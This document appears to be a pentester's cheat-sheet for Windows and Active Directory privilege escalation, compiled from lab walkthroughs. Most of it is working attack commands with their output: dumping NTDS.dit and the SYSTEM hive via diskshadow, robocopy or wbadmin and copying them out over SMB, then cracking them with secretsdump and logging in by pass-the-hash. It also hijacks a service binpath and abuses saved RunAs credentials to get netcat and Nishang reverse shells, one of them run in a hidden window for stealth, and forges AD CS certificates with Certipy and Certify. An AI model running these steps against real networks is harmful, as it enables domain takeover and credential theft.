Method 2: Diskshadow & Dynamic Link Libraries (DLLs)

Method 3: Wbadmin Utility
```


**Method 1 - Diskshadow & Robocopy**
Diskshadow creates copies of a currently used drive, while Robocopy copies files and directories from one location to another.
We cannot copy the system files directly using regular copy commands because they are always running and in use.

To create the live copy, we run the below script that performs a full backup of the C: drive and exposes it as a network drive with the drive letter E:.

```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Script Breakdown
```
1. set verbose on - enable verbose
2. set metadata C:\Windows\Temp\meta.cab - Then, it sets the location of the metadata file, The meta.cab file is created when we create the shadow copy of the drive. It stores information about our shadow copy, such as the creation date and time, the volume’s name, and the copy’s size.
3. set context clientaccessible and set context persistent - Next, we set the contexts of the backup to be client-accessible and persistent. So, the backups can be accessible to us after the script runs and persistent when we reboot the machine
4. begin backup - Then, the backup command initiates the backup operation, includes the C: drive, and assigns it an alias such as cdrive for reference. We can have any alias name we want.
5. Finally, the create command creates the actual backup, then exposes the C: drive as a network drive with the letter E:and finalizes the operation with the end backup command.
```
1. Prepare dikshadow.txt and upload it to target server
```
- cat diskshadow.txt
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```
Note - The mount path E: must be an empty directory. it can be any directory but should be empty, you can also create one like c:\tmp\data

Before uploading make sure to convert file by unix2dos, otherwise it will give some errors due to line breaks and related formatting
```
root@kali# unix2dos vss.dsh 
```
```
*Evil-WinRM* PS C:\Users\xyan1d3> mkdir C:\tmp
*Evil-WinRM* PS C:\tmp> upload diskshadow.txt
```

After putting together the script, we pass it to the Diskshadow utility to create the shadow copy that will create a snapshot of the drive while the files are in use.

2. Execute the diskshadow.exe from the created directory
```
*Evil-WinRM* PS C:\tmp> diskshadow.exe /s c:\tmp\diskshadow.txt
```
3. When the process is complete, switch to the E: drive (or whatecer drive you mentioned in script) and copy the NTDS.dit file using Robocopy to the Temp file created in the C: drive.
```
cd E:

robocopy /b E:\Windows\ntds . ntds.dit

```
4. Next, we get the system registry hive that contains the keys needed to decrypt the NTDS file with the reg save command.
```
reg save HKLM\SYSTEM C:\tmp\system
```
5. Then, we download the files locally to our machine to extract the hashes. I used the download command in the Evil-Winrm shell.
```
# download direct by winrrm

*Evil-WinRM* PS C:\programdata> download ntds.dit
*Evil-WinRM* PS C:\programdata> download system

# OR by starting SMB server on kali

root@kali# smbserver.py s . -smb2support -username df -password df
*Evil-WinRM* PS C:\programdata> net use \\10.10.14.14\s /u:df df
*Evil-WinRM* PS C:\programdata> reg.exe save hklm\system \\10.10.14.14\system
```

6. Now Dump the hashes.
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL

```
7. Finally, from here we get the administrator Hashes. We can use this to login into the system using Evil-WinRM
```
evil-winrm -i $IP -u administrator -H 9689931bed40ca5a2ce1218210177f0c
```

**Method 2: Diskshadow & Dynamic Link Libraries (DLLs)**
The second method uses Diskshadow to create a shadow copy and Dynamic Link Libraries (DLLs) to copy the system files as an alternative to Robocopy.

Create the Shadow copy with Diskshadow, as shown in method 1 (step 1 and 2)

3. Now let's abuse the SeBackupPrivilege. For this, we need 2 dll files (SeBackupPrivilegeCmdLets.dll is for validating that the SeBackupPrivilege is enabled, and the SeBackupPrivilegeUtils.dll is for copying the files) which we can download from [here](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug). After downloading we need to execute it in the following way and then download the hashes.

```
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite

*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system
```
Download both files
```
# download direct by winrrm

*Evil-WinRM* PS C:\programdata> download ntds.dit
*Evil-WinRM* PS C:\programdata> download system

# OR by starting SMB server on kali

root@kali# smbserver.py s . -smb2support -username df -password df
*Evil-WinRM* PS C:\programdata> net use \\10.10.14.14\s /u:df df
*Evil-WinRM* PS C:\programdata> reg.exe save hklm\system \\10.10.14.14\system
```
4. Now Dump the hashes.
```
python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL
```

5. Finally, from here we get the administrator Hashes. We can use this to login into the system using Evil-WinRM
```
evil-winrm -i $IP -u administrator -H 9689931bed40ca5a2ce1218210177f0c
```

**Method 3: Wbadmin Utility**
The Wbadmin utility is used to create and restore backups in Windows environment. To create a backup, use the following command:
1. run the tool
```
*Evil-WinRM* PS C:\tmp> wbadmin start backup -quiet -backuptarget:\\dc01\c$\temp -include:c:\windows\ntds
```
```
# Breakdown
wbadmin: Invokes the tool.
start backup: Initiates a backup operation.
-quiet: Suppresses prompts or messages during the backup process.
-backuptarget: Specifies the backup target location (\\dc01\c$\temp).
-include: Specifies file that we want to backup (c:\windows\ntds).
```
2. After running the tool, we verify the backup using the get versions command. As seen below, the backup was created in the temp directory \\dc01\C$\temp.
```
wbadmin get versions
```
3. To restore the backup we created, we run the below command
```
webadmin start recovery -quiet -version:07/26/2021-03:16 -itemtype:file -item:c:\windows\ntds\ntds.dit -recoverytarget:c:\temp -notrestoreacl
```
```
-version: Specifies the backup version from which to recover the file.
-itemtype:file : Specifies that the item to be recovered is a file.
-item: Specifies the exact location of the NTDS file to be recovered (c:\windows\ntds\ntds.dit).
-recoverytarget: Specifies the location where the recovered file should be placed (c:\temp).
-notrestoreacl: Instructs the recovery process not to restore the ACLs (Access Control Lists) of the recovered file. This means the recovered file will inherit the ACLs of the target location (c:\temp).
```
4. After that, we copy the system file for hash extraction later.
```
reg save HKLM\SYSTEM C:\tmp\system
```
5. Then, we download the files locally to our machine to extract the hashes. I used the download command in the Evil-Winrm shell.
```
# download direct by winrrm

*Evil-WinRM* PS C:\programdata> download ntds.dit
*Evil-WinRM* PS C:\programdata> download system

# OR by starting SMB server on kali

root@kali# smbserver.py s . -smb2support -username df -password df
*Evil-WinRM* PS C:\programdata> net use \\10.10.14.14\s /u:df df
*Evil-WinRM* PS C:\programdata> reg.exe save hklm\system \\10.10.14.14\system
```
6. Now Dump the hashes.
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL

```
7. Finally, from here we get the administrator Hashes. We can use this to login into the system using Evil-WinRM
```
evil-winrm -i $IP -u administrator -H 9689931bed40ca5a2ce1218210177f0c
```

### SeLoadDrivverPrivilege & Print Operators Group

It is a very dangerous privilege. It allows the user to load kernel drivers and execute code with kernel privileges.

The print operators group may seem quite innocuous to the naked eye, however it has the ability to load device drivers in domain controllers as well as manage printer-type objects in the active directory. Additionally, this group has the capabilities to authenticate itself in a domain controller, so it is of special interest to verify the membership of users in this group.

```
*Evil-WinRM* PS C:\Users\svc-printer\documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

*Evil-WinRM* PS C:\Users\svc-printer\documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/30/2025 10:14:01 PM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.

```

[More](https://www.hackingarticles.in/fuse-hackthebox-walkthrough/)
[More](https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#enumeration-1)
[More](https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/)


### Server Operators

A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer. 

```
*Evil-WinRM* PS C:\Users\svc-printer\documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/30/2025 10:14:01 PM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

**Exploit**

[More](https://0xdf.gitlab.io/2022/05/05/htb-return.html#shell-as-system)

The user is part of "Server Operators", which means this user can start and stop services, we'll abuse this by `nc64.exe` to give us a reverse shell.

1. Upload nc64.exe
```
*Evil-WinRM* PS C:\programdata> upload /opt/netcat/nc64.exe
```

2. Typically, we would want to get a list of services that this account can modify, but it seems this user doesn’t have access to the Service Control Manager:
```
*Evil-WinRM* PS C:\Users\svc-printer\documents> sc.exe query
[SC] OpenSCManager FAILED 5:

Access is denied.
```
3. Going in a bit blind
```
*Evil-WinRM* PS C:\Users\svc-printer\documents> sc.exe config VSS binpath="C:\users\svc-printer\documents\nc.exe -e cmd 10.10.14.6 443"
[SC] ChangeServiceConfig SUCCESS
```
4. It works! I’ll try to stop the service, but it’s not started. Then I’ll start it
```
*Evil-WinRM* PS C:\Users\svc-printer\documents> sc.exe stop VSS
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\Users\svc-printer\documents> sc.exe start VSS

```
5. And I got the shell
```
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.108] 50386
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```




### Abuse (AD CS) Active Directory Certificate Services
Active Directory Certificate Services (AD CS) is Microsoft’s Public Key Infrastructure (PKI) implementation that enables the issuance, management, and revocation of digital certificates. 
These certificates, in the X.509 format, are used for various purposes such as encryption, digital signatures, and user authentication within an Active Directory environment.

By exploiting misconfigurations and vulnerabilities in AD CS, attackers can abuse certificates to authenticate as any user or machine, granting them extensive privileges and compromising the entire domain. One of the most significant risks associated with AD CS is domain escalation.

[More](https://redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs/)

We can do this using below tools


1. Certipy - remotely from kali

2. Certify - by uploading it on target

**Certipy**

It has a `find` command that will identify the vulnerable template: [Certipy] (https://github.com/ly4k/Certipy)
```
1. Identify vulnerable template using 'find' command 
2. get the `.pfx` file using command `req` as we did using certify.exe and openssl 
3. using `auth` command take that certificate (administrator.pfx) and get the hash.
```

1. Identify vulnerable template using command `find`
```
certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target 10.10.11.202 -text -stdout -vulnerable
```
2. get the `.pfx` file using command `req` as we did using certify.exe and openssl 
```
certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target 10.10.11.202 -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
```
3. using `auth` command take that certificate (administrator.pfx) and get the hash.
```
certipy auth -pfx administrator.pfx
```

**Attack Scenario 1 ESC7**

[More] (https://0xdf.gitlab.io/2024/03/16/htb-manager.html#enumeration)

0. Find vulernale tempplate
```
certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```
We found Raven has dangerous permissions, with the label ESC7.

ESC7 is when a user has either the “Manage CA” or “Manage Certificates” access rights on the certificate authority itself. Raven has ManageCa rights (shown in the output above).

The steps to exploit this are on the Certipy README. https://github.com/ly4k/Certipy

1. First, I’ll need to use the Manage CA permission to give Raven the Manage Certificates permission:
```
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
2. Now Raven shows up there where they didn’t before:
```
certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
...[snip]...
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
...[snip]...
```
3. The first step is to request a certificate based on the Subordinate Certification Authority (SubCA) template provided by ADCS.
```
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
4. This fails, but it saves the private key involved. Then, using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:
```
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
5. Now, the issued certificate can be retrieved using the req command:
```
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
6. With this certificate as the administrator user, the easiest way to get a shell is to use it to get the NTLM hash for the user with the auth command
```
certipy auth -pfx administrator.pfx -dc-ip manager.htb
```
7. I’ll use ntpdate to sync my VM’s time to Manager’s:
```
sudo ntpdate 10.10.11.236
```
8. Now it works, leaking the hash:
```
oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236                                   
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```
With the hash, I can get a shell as administrator using Evil-WinRM:

**Attack Scenario 1 ESC9**

[More](https://0xdf.gitlab.io/2025/03/15/htb-certified.html#esc9-background)


**Certify**
```
0. Identify is cetificate issuer is AD 
1. Identify ADCS 
2. Identify Vulnerable Template
3. Abuse Template
4. Check for scenario in Certify Github Readme and exploit and get the NTLM hash
```
0. Identify is cetificate issuer is AD 

```
# It’s interesting to note the certificate authority that issued the certificate is sequel-DC-CA.


oxdf@hacky$ openssl s_client -showcerts -connect 10.10.11.202:3269  | openssl x509 -noout -text
...[snip]...                                                
Certificate:                                                     
    Data:                                                        
        Version: 3 (0x2)                                         
        Serial Number:   
            1e:00:00:00:04:90:52:7b:fc:91:38:74:2f:00:00:00:00:00:04 
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC = htb, DC = sequel, CN = sequel-DC-CA
        Validity                                  
            Not Before: Nov 18 21:20:35 2022 GMT
            Not After : Nov 18 21:20:35 2023 GMT
        Subject: CN = dc.sequel.htb   
        Subject Public Key Info:                   
            Public Key Algorithm: rsaEncryption
...[snip]...
```

1. Identify ADCS 

Another quick way to check for this is using crackmapexec
```
# It finds the same CN: sequel-DC-CA that I noticed above.

oxdf@hacky$ crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.202    636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
ADCS                                                Found PKI Enrollment Server: dc.sequel.htb
ADCS                                                Found CN: sequel-DC-CA
```

2. Identify Vulnerable Template

For this we will use a tool called `Certify` (Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).)

Download Certify from SharpCollection [here](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any) and upload it to target.
```
*Evil-WinRM* PS C:\tmp> upload certify.exe
```
As per Certify [ReadMe](https://github.com/GhostPack/Certify) 

By default, this looks across standard low privilege groups. I like to add /currentuser to instead look across the groups for the current user, but both are valuable depending on the scenario.
```
*Evil-WinRM* PS C:\tmp> .\Certify.exe find /vulnerable /currentuser
```
This gives us vulnerable certificate.
```
[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.6704482

```

3. Abuse Template

we can have multiple scenerio as per Certify [ReadMe](https://github.com/GhostPack/Certify) 

In above case The danger is that sequel\Domain Users has Enrollment Rights for the certificate (this is scenario 3 in the Certify README).

1. Request a certificate with an alternative name of administrator. It returns a cert.pem
```
*Evil-WinRM* PS C:\tmp> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```

2. Copy everything from -----BEGIN RSA PRIVATE KEY----- to -----END CERTIFICATE----- into a file cert.pem on our host and convert it to a .pfx using the command given, entering no password when prompted:
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

3. Upload cert.pfx, as well as a copy of Rubeus downloaded from [SharpCollection](https://github.com/GhostPack/Rubeus) [download](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe), and then run the asktgt command, passing it the certificate to get a TGT as administrator

```
*Evil-WinRM* PS C:\tmp> upload cert.pfx
*Evil-WinRM* PS C:\tmp> upload Rubeus.exe
```
```
*Evil-WinRM* PS C:\tmp> .\Rubeus.exe asktgt /user:administrator /certificate:C:\tmp\cert.pfx /getcredentials /show /nowrap
```

4. We got the NTLM hash in last, now we can simply winrm using this

```
evil-winrm -i 10.10.11.202 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
```

### Runas

[More](https://juggernaut-sec.com/runas/)

RunAs can be thought of as a less capable version of `sudo` for Windows.

Two ways this can be exploited
```
1. RunAs Privilege Escalation via Stored Credentials

  - Attack Scenerio using `Nishang`

2. RunAs Privilege Escalation via Provided Credentials

```
**RunAs Privilege Escalation via Stored Credentials**

The first way we will utilize RunAs is by abusing a poor configuration choice to store local admin credentials in the Credential Manager.

1. Find Stored Credentials

Finding stored credentials can be accomplished using one simple command:
```
cmdkey /list
```
![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/05/image-192.png)


2. Executing Commands Using Stored Credentials

runas spawns a new shell to execute the command, we cannot see the output from our current shell. So instead, we can redirect the output of the command to a file.

```
runas /env /noprofile /savecred /user:JUGG-efrost\administrator "cmd.exe /c whoami > whoami.txt"
```

![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/05/image-197.png)


3. Getting shell

```
runas /env /noprofile /savecred /user:JUGG-efrost\administrator "c:\temp\nc.exe 172.16.1.30 443 -e cmd.exe"
```
![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/05/image-198.png)

One thing that is worth mentioning is that this will open a cmd prompt on the victim machine and the user can easily close it on us. For this reason, we could add some stealth by using PowerShell to execute the command from a hidden window. This will leave no open windows on the victim that they can easily close and kill our shell.

```
runas /env /noprofile /savecred /user:JUGG-efrost\administrator "powershell.exe -w hidden -c c:\temp\nc.exe 172.16.1.30 443 -e cmd.exe"
```

Additionally, if we had GUI access, lets say from an RDP session, then we would just replace the command we want to execute in quotes with “cmd”, which will spawn a cmd prompt as the local admin account.

```
runas /env /noprofile /savecred /user:JUGG-efrost\administrator cmd
```

**ATTACK SCENARIO**

https://0xdf.gitlab.io/2019/03/02/htb-access.html#enumeration

We found a runas command in lnk file, which made us check for stored credentials in credential manager

```
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
LF@ 7#P/PO :+00/C:\R1M:Windows:M:*wWindowsV1MVSystem32:MV*System32X2P:
                                                                       runas.exe:1:1*Yrunas.exeL-KEC:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%
wN]ND.Q`Xaccess_8{E3Oj)H)ΰ[_8{E3Oj)H)ΰ[  1SPSXFL8C&me*S-1-5-21-953262931-566350628-63446256-500
```

Interesting is `C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred`

lets look for cached/stored credentials in credential manager

```
C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

1. clone a copy of Nishang from github

https://github.com/samratashok/nishang

I’ll make a www directory to serve from, and I’ll grab a copy of the shell I’m going to use:

```
root@kali:/opt# git clone https://github.com/samratashok/nishang.git

root@kali:/opt# mkdir ~/www
root@kali:/opt# cp nishang/Shells/Invoke-PowerShellTcp.ps1 ~/www/
```

2. for reverse shell we need to add below command at the bottom of script
```
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```
```
root@kali# tail Invoke-PowerShellTcp.ps1 
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443
```

3. serve the shell via http server and also start a netcat listener
```
root@kali# python3 -m http.server 80

root@kali# nc -lnvp 443
```

4. from target use telnet to execute shell exploiting the runas command we found

```
C:\Users\security\AppData\Local\Temp>runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')"
```

Note this is basically fetching our shell as administrator and excuting it.

5. we get a shell back
```
root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.98] 49164
Windows PowerShell running as user Administrator on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
access\administrator
```


**RunAs Privilege Escalation via Provided Credentials**

Let’s say that when we got a foothold on the victim, we did not find any stored credentials using the cmdkey /list command; however, we did manage to find credentials for another user in a file somewhere on the filesystem

We get prompted for the password and once it has been successfully entered, a cmd prompt will open as the user we specified.

1. Command execution

If the account is not domain joined remove the <domain>\username portion from the runas command and use either just username or <hostname>\username.

```
runas /env /noprofile /user:juggernaut.local\cmarko cmd
```

![alt text](https://juggernaut-sec.com/wp-content/uploads/2022/05/image-199.png)

